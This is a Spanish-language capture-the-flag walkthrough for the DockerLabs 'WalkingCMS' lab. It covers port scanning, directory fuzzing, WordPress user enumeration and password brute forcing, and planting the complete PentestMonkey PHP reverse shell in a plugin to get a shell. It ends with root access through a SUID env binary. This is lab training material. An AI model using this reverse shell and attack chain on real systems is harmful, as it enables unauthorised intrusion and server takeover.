# WalkingCMS — DockerLabs.es 🐳

<img width="549" height="299" alt="1" src="https://github.com/user-attachments/assets/0f79de50-c102-4630-9cf4-7812ace8633f" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Iniciamos con un escaneo en nmap:

```bash
sudo nmap -p- --min-rate 2000 -A -sS -Pn -n 172.17.0.2 -oN escaneo.txt
```

<img width="552" height="237" alt="2" src="https://github.com/user-attachments/assets/d7c32229-6140-4cb8-bd2d-7d274d6a16ac" />

Tenemos el puerto 80 abierto, por lo que vamos a ver qué contiene la página

<img width="909" height="588" alt="3" src="https://github.com/user-attachments/assets/0a67931f-59a8-43af-9948-1a306b647d25" />


Al parecer no tiene nada interesante, por lo que decido hacer un fuzzing web a la ip

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,py,php,sh,html
```

<img width="743" height="393" alt="4" src="https://github.com/user-attachments/assets/8831b672-d2af-4c94-b823-c6dbd6a47892" />

Encontramos el directorio “/wordpress” y entramos.

<img width="1208" height="551" alt="5" src="https://github.com/user-attachments/assets/af2880e6-6bf1-425e-88f5-7f52c96f30c8" />

Luego de hacer una búsqueda exhaustiva, no encontramos nada, paso siguiente realizo otro fuzzing web a la ip pero la directorio “/wordpress”

```bash
gobuster dir -u http://172.17.0.2/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,py,php,sh,html
```

<img width="887" height="309" alt="6" src="https://github.com/user-attachments/assets/d08d005b-a320-4941-a20e-a5112b3a4313" />

Luego entramos al directorio “/wp-login.php” y nos encontramos con un panel de login

<img width="765" height="548" alt="7" src="https://github.com/user-attachments/assets/59dfb001-8bb6-4576-a4ab-be0ec21fbd85" />




---

## 2. Explotación

En este punto voy a enumerar todos los usuarios del sistema con wpscan de la siguiente manera

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u
```

Y nos reporta el usuario “mario”

<img width="408" height="153" alt="8" src="https://github.com/user-attachments/assets/6ab3cee7-3249-479e-8d13-c2ab9e1aa9f9" />

Una vez encontrado el usuario, hago una fuerza bruta para saber la contraseña con el siguiente comando:

```bash
wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames 'mario'
```

<img width="310" height="56" alt="9" src="https://github.com/user-attachments/assets/0a48ee41-98a9-4448-b79c-aac5cd2d190a" />

Ingresamos las credenciales en el login de wordpress y logramos tener acceso

<img width="1351" height="578" alt="10" src="https://github.com/user-attachments/assets/c83156b9-275c-474d-aecf-b7bc1ce37bac" />

Luego vamos al apartado “Plugins” y seleccionamos el plugin “Hello Dolly”

<img width="1355" height="563" alt="11" src="https://github.com/user-attachments/assets/e6e32ed9-4f62-4431-87e2-d366b15ce993" />

Le inyectamos una reverse shell de PentestMonkey y lo guardamos

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

<img width="1242" height="563" alt="12" src="https://github.com/user-attachments/assets/1570913c-829d-4318-b0d3-1964374467b9" />

Luego vamos al apartado de “Plugins instalados” Y seleccionamos el plugin “Hello Dolly”

<img width="962" height="558" alt="13" src="https://github.com/user-attachments/assets/17b8d4b1-a594-4b79-941d-64e75a06a86b" />


Antes que nada, primero nos ponemos en escucha con netcat en el puerto 443

Y luego hacemos click en activar

<img width="552" height="83" alt="14" src="https://github.com/user-attachments/assets/736d6704-7f5e-4ab7-85b7-91e7c4be4ebf" />

<img width="325" height="154" alt="15" src="https://github.com/user-attachments/assets/b7508dee-5588-4f8a-8743-59e5fda94628" />

<img width="859" height="184" alt="16" src="https://github.com/user-attachments/assets/b2b823fb-7cfa-4b7a-a68d-354615625514" />

Una vez dentro realizamos el tratamiento de la TTY

```bash
script /dev/null -c bash
control_z

stty raw -echo; fg
reset xterm

export TERM=xterm
expoert SHELL=bash
```



---

## 3. Escalada de Privilegios

Y como el comando sudo -l no funciona, probamos con los binarios SUID de la siguiente manera

<img width="499" height="194" alt="17" src="https://github.com/user-attachments/assets/ccf1be8f-8871-4062-ab50-0896e259d7ea" />

En esta lista nos resulta interesante el binario “env” por lo que vamos a explotarlo.

Para eso ejecutamos el comando:

```bash
/usr/bin/env /bin/bash -p
```

<img width="548" height="107" alt="18" src="https://github.com/user-attachments/assets/9e8ae812-11d2-423c-b837-69a8f07c9192" />



**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Reconocimiento con Nmap
- Enumeración de servicios
- Escalada de privilegios
